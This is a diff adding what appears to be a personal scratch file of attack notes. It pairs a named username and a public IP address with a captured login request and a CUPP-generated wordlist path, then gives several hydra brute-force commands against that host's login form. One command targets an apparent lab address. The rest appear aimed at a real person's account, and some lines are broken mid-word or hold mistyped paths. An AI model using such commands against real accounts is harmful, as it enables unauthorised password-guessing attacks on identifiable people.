@@ -1,0 +1,28 @@
+gajaythiran
+
+
+ip add: 198.54.116.36 
+
+
+Your login or password or turing image code is wrong. Please check this information.
+
+
+/home/nitro/cupp/gajay.txt
+
+GET
+
+a=login
+form_id=17016873085186&form_token=ce72fffed457330e77311697b0b0e46c&a=do_login&follow=&follow_id=&username=hey&password=jjsjs
+
+mainn
+
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=admin&password=^PASS^:Invalid Password!"
+
+sudo hydra -l gajaythiran -P /homenitro/cupp/gajay.txt 198.54.116.36  http-post-form "/username=gajaythiran&password=^PASS^:Your login or password or turing image code is wrong. Please check this infor
+
+
+
+mation.
+
+
+ sudo hydra -l gajaythiran -P /homenitro/cupp/gajay.txt 198.54.116.36  http-post-form "/username=^USER^&password=^PASS^:Your login  or password or turing image code is wrong. Please check this information." -V -f            
